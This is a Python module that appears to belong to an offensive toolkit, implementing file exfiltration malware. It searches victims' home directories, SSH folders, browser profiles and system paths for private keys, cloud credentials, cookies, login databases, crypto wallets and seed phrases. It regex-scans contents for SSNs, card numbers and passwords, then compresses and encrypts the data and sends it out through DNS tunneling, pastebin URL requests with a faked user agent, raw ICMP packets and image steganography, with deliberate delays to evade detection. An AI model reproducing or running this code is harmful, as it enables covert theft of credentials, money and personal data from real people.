#!/usr/bin/env python3
"""
Advanced File Exfiltration Implementation
Intelligent file discovery, compression, chunking, and covert transfer
"""

import os
import sys
import io
import json
import time
import hashlib
import zipfile
import tarfile
import base64
import threading
import queue
from pathlib import Path
from datetime import datetime
from typing import List, Dict, Any, Optional, Tuple

from Core.config_loader import config
from Core.logger import get_logger

log = get_logger('exfiltration')

class FileExfiltrator:
    """
    Advanced file exfiltration with intelligent discovery and transfer
    """
    
    def __init__(self, chunk_size: int = 1024 * 1024):  # 1MB chunks
        """
        Initialize exfiltrator
        
        Args:
            chunk_size: Size of chunks for large file transfer
        """
        
        self.chunk_size = chunk_size
        self.exfil_queue = queue.Queue()
        self.transfer_thread = None
        self.running = False
        
        # File patterns of interest
        self.interesting_patterns = self._load_patterns()
        
        # Statistics
        self.stats = {
            'files_found': 0,
            'files_exfiltrated': 0,
            'bytes_transferred': 0,
            'errors': 0
        }
        
        log.info("File exfiltrator initialized")
    
    def _load_patterns(self) -> Dict[str, List[str]]:
        """Load file patterns to search for"""
        
        return {
            'documents': [
                '*.doc', '*.docx', '*.pdf', '*.txt', '*.rtf',
                '*.xls', '*.xlsx', '*.ppt', '*.pptx', '*.odt'
            ],
            'credentials': [
                '*.pem', '*.key', '*.crt', '*.cer', '*.pfx',
                '*.p12', 'id_rsa', 'id_dsa', '*.ssh', '*.gpg',
                '.aws/credentials', '.azure/credentials'
            ],
            'config': [
                '*.conf', '*.config', '*.cfg', '*.ini', '*.json',
                '*.yaml', '*.yml', '*.toml', '.env', '*.properties'
            ],
            'code': [
                '*.py', '*.js', '*.java', '*.c', '*.cpp', '*.go',
                '*.rs', '*.php', '*.rb', '*.sh', '*.bat', '*.ps1'
            ],
            'databases': [
                '*.db', '*.sqlite', '*.sqlite3', '*.mdb', '*.accdb',
                '*.sql', '*.dump', '*.bak'
            ],
            'archives': [
                '*.zip', '*.rar', '*.7z', '*.tar', '*.gz', '*.bz2'
            ],
            'browser': [
                'cookies.sqlite', 'places.sqlite', 'key*.db',
                'Login Data', 'Cookies', 'History', 'Bookmarks'
            ],
            'wallet': [
                'wallet.dat', '*.wallet', 'seed.txt', '*seed*',
                '*.keystore', 'UTC--*'
            ],
            'images': [
                '*.jpg', '*.jpeg', '*.png', '*.gif', '*.bmp',
                '*.tiff', '*.svg'
            ],
            'sensitive': [
                '*password*', '*secret*', '*private*', '*confidential*',
                '*sensitive*', '*classified*'
            ]
        }
    
    def discover_files(self, paths: List[str] = None, 
                       categories: List[str] = None,
                       max_size: int = 100 * 1024 * 1024) -> List[Dict[str, Any]]:
        """
        Discover files of interest
        
        Args:
            paths: Paths to search (default: user directories)
            categories: Categories to search for
            max_size: Maximum file size in bytes
            
        Returns:
            List of discovered files
        """
        
        if not paths:
            paths = self._get_default_paths()
        
        if not categories:
            categories = list(self.interesting_patterns.keys())
        
        discovered = []
        
        # Build pattern list
        patterns = []
        for category in categories:
            if category in self.interesting_patterns:
                patterns.extend(self.interesting_patterns[category])
        
        log.info(f"Discovering files in {len(paths)} paths with {len(patterns)} patterns")
        
        for search_path in paths:
            if not os.path.exists(search_path):
                continue
            
            try:
                for root, dirs, files in os.walk(search_path):
                    # Skip system directories
                    dirs[:] = [d for d in dirs if not self._should_skip_dir(d)]
                    
                    for file in files:
                        file_path = os.path.join(root, file)
                        
                        try:
                            # Check size
                            file_stat = os.stat(file_path)
                            
                            if file_stat.st_size > max_size:
                                continue
                            
                            # Check patterns
                            if self._matches_pattern(file, patterns):
                                file_info = {
                                    'path': file_path,
                                    'name': file,
                                    'size': file_stat.st_size,
                                    'modified': datetime.fromtimestamp(file_stat.st_mtime).isoformat(),
                                    'category': self._get_category(file),
                                    'hash': None  # Will be calculated if needed
                                }
                                
                                discovered.append(file_info)
                                self.stats['files_found'] += 1
                                
                        except (OSError, PermissionError):
                            pass
                            
            except Exception as e:
                log.error(f"Error discovering files in {search_path}: {e}")
        
        log.info(f"Discovered {len(discovered)} files")
        
        return discovered
    
    def _get_default_paths(self) -> List[str]:
        """Get default paths to search"""
        
        paths = []
        
        # User home
        home = os.path.expanduser('~')
        paths.append(home)
        
        # Common document locations
        if sys.platform == 'win32':
            paths.extend([
                os.path.join(home, 'Documents'),
                os.path.join(home, 'Desktop'),
                os.path.join(home, 'Downloads'),
                os.path.join(home, 'Pictures'),
                os.path.join(home, 'AppData', 'Roaming'),
                os.path.join(home, 'AppData', 'Local'),
                'C:\\ProgramData'
            ])
        else:
            paths.extend([
                os.path.join(home, 'Documents'),
                os.path.join(home, 'Desktop'),
                os.path.join(home, 'Downloads'),
                os.path.join(home, '.config'),
                os.path.join(home, '.ssh'),
                '/etc',
                '/var/www'
            ])
        
        # Filter existing paths
        paths = [p for p in paths if os.path.exists(p)]
        
        return paths
    
    def _should_skip_dir(self, dirname: str) -> bool:
        """Check if directory should be skipped"""
        
        skip_dirs = [
            'node_modules', '__pycache__', '.git', '.svn',
            'venv', 'env', '.venv', 'virtualenv',
            'Windows', 'Program Files', 'Program Files (x86)',
            'System32', 'SysWOW64', '.Trash', '$Recycle.Bin'
        ]
        
        return dirname in skip_dirs or dirname.startswith('.')
    
    def _matches_pattern(self, filename: str, patterns: List[str]) -> bool:
        """Check if filename matches any pattern"""
        
        import fnmatch
        
        filename_lower = filename.lower()
        
        for pattern in patterns:
            if fnmatch.fnmatch(filename_lower, pattern.lower()):
                return True
        
        return False
    
    def _get_category(self, filename: str) -> str:
        """Get file category"""
        
        filename_lower = filename.lower()
        
        for category, patterns in self.interesting_patterns.items():
            for pattern in patterns:
                import fnmatch
                if fnmatch.fnmatch(filename_lower, pattern.lower()):
                    return category
        
        return 'other'
    
    def exfiltrate_file(self, file_path: str, 
                       compress: bool = True,
                       encrypt: bool = True) -> bool:
        """
        Exfiltrate single file
        
        Args:
            file_path: Path to file
            compress: Whether to compress
            encrypt: Whether to encrypt
            
        Returns:
            True if successful
        """
        
        try:
            if not os.path.exists(file_path):
                log.error(f"File not found: {file_path}")
                return False
            
            # Read file
            with open(file_path, 'rb') as f:
                data = f.read()
            
            # Calculate hash
            file_hash = hashlib.sha256(data).hexdigest()
            
            # Prepare metadata
            metadata = {
                'path': file_path,
                'name': os.path.basename(file_path),
                'size': len(data),
                'hash': file_hash,
                'timestamp': datetime.now().isoformat()
            }
            
            # Compress if requested
            if compress:
                data = self._compress_data(data)
                metadata['compressed'] = True
            
            # Encrypt if requested
            if encrypt:
                data = self._encrypt_data(data)
                metadata['encrypted'] = True
            
            # Add to queue
            self.exfil_queue.put({
                'metadata': metadata,
                'data': data
            })
            
            self.stats['files_exfiltrated'] += 1
            self.stats['bytes_transferred'] += len(data)
            
            log.info(f"Queued file for exfiltration: {file_path}")
            
            return True
            
        except Exception as e:
            log.error(f"Failed to exfiltrate {file_path}: {e}")
            self.stats['errors'] += 1
            return False
    
    def exfiltrate_directory(self, dir_path: str,
                           archive: bool = True) -> bool:
        """
        Exfiltrate entire directory
        
        Args:
            dir_path: Directory path
            archive: Whether to archive directory
            
        Returns:
            True if successful
        """
        
        try:
            if not os.path.isdir(dir_path):
                log.error(f"Directory not found: {dir_path}")
                return False
            
            if archive:
                # Create archive
                archive_data = self._create_archive(dir_path)
                
                # Queue for transfer
                metadata = {
                    'path': dir_path,
                    'name': os.path.basename(dir_path) + '.tar.gz',
                    'size': len(archive_data),
                    'type': 'archive',
                    'timestamp': datetime.now().isoformat()
                }
                
                self.exfil_queue.put({
                    'metadata': metadata,
                    'data': archive_data
                })
                
                log.info(f"Queued directory archive: {dir_path}")
                
            else:
                # Exfiltrate files individually
                for root, dirs, files in os.walk(dir_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        self.exfiltrate_file(file_path)
            
            return True
            
        except Exception as e:
            log.error(f"Failed to exfiltrate directory {dir_path}: {e}")
            return False
    
    def _compress_data(self, data: bytes) -> bytes:
        """Compress data using gzip"""
        
        import gzip
        
        return gzip.compress(data, compresslevel=9)
    
    def _encrypt_data(self, data: bytes) -> bytes:
        """Encrypt data"""
        
        try:
            from cryptography.fernet import Fernet
            
            # Generate key from config or default
            key = config.get('crypto.key', 'default_key_123')
            
            # Derive Fernet key
            import hashlib
            key_hash = hashlib.sha256(key.encode()).digest()
            fernet_key = base64.urlsafe_b64encode(key_hash)
            
            # Encrypt
            f = Fernet(fernet_key)
            
            return f.encrypt(data)
            
        except Exception as e:
            log.error(f"Encryption failed: {e}")
            return data
    
    def _create_archive(self, dir_path: str) -> bytes:
        """Create tar.gz archive of directory"""
        
        buffer = io.BytesIO()
        
        with tarfile.open(fileobj=buffer, mode='w:gz') as tar:
            tar.add(dir_path, arcname=os.path.basename(dir_path))
        
        return buffer.getvalue()
    
    def chunk_file(self, file_path: str) -> List[bytes]:
        """
        Split file into chunks for transfer
        
        Args:
            file_path: Path to file
            
        Returns:
            List of chunks
        """
        
        chunks = []
        
        try:
            with open(file_path, 'rb') as f:
                while True:
                    chunk = f.read(self.chunk_size)
                    if not chunk:
                        break
                    chunks.append(chunk)
            
            log.debug(f"Split {file_path} into {len(chunks)} chunks")
            
        except Exception as e:
            log.error(f"Failed to chunk file {file_path}: {e}")
        
        return chunks
    
    def search_sensitive_data(self, content: bytes) -> List[Dict[str, Any]]:
        """
        Search for sensitive data in file content
        
        Args:
            content: File content
            
        Returns:
            List of findings
        """
        
        findings = []
        
        try:
            # Convert to text if possible
            try:
                text = content.decode('utf-8', errors='ignore')
            except:
                return findings
            
            # Patterns to search for
            patterns = {
                'email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
                'ip_address': r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b',
                'phone': r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b',
                'ssn': r'\b\d{3}-\d{2}-\d{4}\b',
                'credit_card': r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b',
                'api_key': r'[a-zA-Z0-9]{32,}',
                'private_key': r'-----BEGIN (RSA |EC |DSA )?PRIVATE KEY-----',
                'aws_key': r'AKIA[0-9A-Z]{16}',
                'password': r'(?i)(password|passwd|pwd)[\s]*[:=][\s]*[^\s]+',
            }
            
            import re
            
            for pattern_name, pattern in patterns.items():
                matches = re.findall(pattern, text)
                
                if matches:
                    findings.append({
                        'type': pattern_name,
                        'count': len(matches),
                        'samples': matches[:5]  # First 5 matches
                    })
            
        except Exception as e:
            log.error(f"Failed to search sensitive data: {e}")
        
        return findings

class StealthExfiltrator:
    """
    Stealthy exfiltration using various covert channels
    """
    
    def __init__(self):
        self.methods = {
            'dns': self._exfil_dns,
            'http': self._exfil_http,
            'icmp': self._exfil_icmp,
            'steganography': self._exfil_stego
        }
        
        log.info("Stealth exfiltrator initialized")
    
    def exfiltrate(self, data: bytes, method: str = 'dns') -> bool:
        """
        Exfiltrate data using specified method
        
        Args:
            data: Data to exfiltrate
            method: Exfiltration method
            
        Returns:
            True if successful
        """
        
        if method not in self.methods:
            log.error(f"Unknown exfiltration method: {method}")
            return False
        
        try:
            return self.methods[method](data)
        except Exception as e:
            log.error(f"Exfiltration failed ({method}): {e}")
            return False
    
    def _exfil_dns(self, data: bytes) -> bool:
        """Exfiltrate via DNS queries"""
        
        try:
            # Use DNS tunneling
            from Core.dns_tunnel import DNSTunnel
            
            tunnel = DNSTunnel()
            
            # Split data into chunks
            chunk_size = 200  # Safe size for DNS
            
            for i in range(0, len(data), chunk_size):
                chunk = data[i:i + chunk_size]
                tunnel.send_data(chunk)
                time.sleep(0.5)  # Avoid detection
            
            return True
            
        except Exception as e:
            log.error(f"DNS exfiltration failed: {e}")
            return False
    
    def _exfil_http(self, data: bytes) -> bool:
        """Exfiltrate via HTTP requests"""
        
        try:
            import urllib.request
            import urllib.parse
            
            # Encode data
            encoded = base64.b64encode(data).decode()
            
            # Split into chunks that fit in URL
            chunk_size = 1000
            
            for i in range(0, len(encoded), chunk_size):
                chunk = encoded[i:i + chunk_size]
                
                # Create request
                url = f"https://pastebin.com/raw/{chunk}"
                
                # Use common user agent
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
                
                req = urllib.request.Request(url, headers=headers)
                
                try:
                    urllib.request.urlopen(req, timeout=5)
                except:
                    pass  # Expected to fail
                
                time.sleep(1)
            
            return True
            
        except Exception as e:
            log.error(f"HTTP exfiltration failed: {e}")
            return False
    
    def _exfil_icmp(self, data: bytes) -> bool:
        """Exfiltrate via ICMP (ping)"""
        
        try:
            import socket
            import struct
            
            # Create raw socket (requires root)
            if os.getuid() != 0:
                log.error("ICMP exfiltration requires root")
                return False
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            
            # ICMP packet structure
            def create_icmp_packet(data_chunk):
                # Type (8 = echo request), Code (0), Checksum (0 initially)
                header = struct.pack('!BBH', 8, 0, 0)
                
                # ID and Sequence
                header += struct.pack('!HH', os.getpid() & 0xFFFF, 1)
                
                # Add data
                packet = header + data_chunk
                
                # Calculate checksum
                checksum = 0
                for i in range(0, len(packet), 2):
                    if i + 1 < len(packet):
                        checksum += (packet[i] << 8) + packet[i + 1]
                    else:
                        checksum += packet[i] << 8
                
                checksum = (checksum >> 16) + (checksum & 0xFFFF)
                checksum = ~checksum & 0xFFFF
                
                # Update packet with checksum
                packet = packet[:2] + struct.pack('!H', checksum) + packet[4:]
                
                return packet
            
            # Send data in ICMP packets
            chunk_size = 32  # Small chunks for ICMP
            
            for i in range(0, len(data), chunk_size):
                chunk = data[i:i + chunk_size]
                packet = create_icmp_packet(chunk)
                
                # Send to DNS server (less suspicious)
                sock.sendto(packet, ('8.8.8.8', 0))
                
                time.sleep(0.1)
            
            sock.close()
            return True
            
        except Exception as e:
            log.error(f"ICMP exfiltration failed: {e}")
            return False
    
    def _exfil_stego(self, data: bytes) -> bool:
        """Exfiltrate via steganography in images"""
        
        try:
            from PIL import Image
            
            # Create innocent-looking image
            img = Image.new('RGB', (800, 600), color='white')
            
            # Hide data in LSB of pixels
            data_bits = ''.join(format(byte, '08b') for byte in data)
            
            pixels = img.load()
            bit_index = 0
            
            for y in range(img.height):
                for x in range(img.width):
                    if bit_index < len(data_bits):
                        pixel = list(pixels[x, y])
                        
                        # Modify LSB of red channel
                        pixel[0] = (pixel[0] & 0xFE) | int(data_bits[bit_index])
                        bit_index += 1
                        
                        pixels[x, y] = tuple(pixel)
                    else:
                        break
            
            # Save image
            buffer = io.BytesIO()
            img.save(buffer, format='PNG')
            
            # Would upload image to image hosting site
            return True
            
        except Exception as e:
            log.error(f"Steganography exfiltration failed: {e}")
            return False

# Test file exfiltration
if __name__ == "__main__":
    import sys
    sys.path.insert(0, '/workspace')
    
    print("Testing File Exfiltration")
    print("-" * 50)
    
    exfil = FileExfiltrator()
    
    print(f"Chunk size: {exfil.chunk_size} bytes")
    print(f"Pattern categories: {list(exfil.interesting_patterns.keys())}")
    
    # Test file discovery (safe test)
    test_paths = ['/tmp']
    discovered = exfil.discover_files(
        paths=test_paths,
        categories=['config'],
        max_size=1024 * 1024  # 1MB
    )
    
    print(f"\n✅ Discovered {len(discovered)} files")
    
    # Test compression
    test_data = b"Test data for compression"
    compressed = exfil._compress_data(test_data)
    print(f"✅ Compression: {len(test_data)} -> {len(compressed)} bytes")
    
    # Test encryption
    encrypted = exfil._encrypt_data(test_data)
    print(f"✅ Encryption: {len(encrypted)} bytes")
    
    # Test stealth exfiltrator
    stealth = StealthExfiltrator()
    print(f"✅ Stealth methods: {list(stealth.methods.keys())}")
    
    print("\n✅ File exfiltration module working!")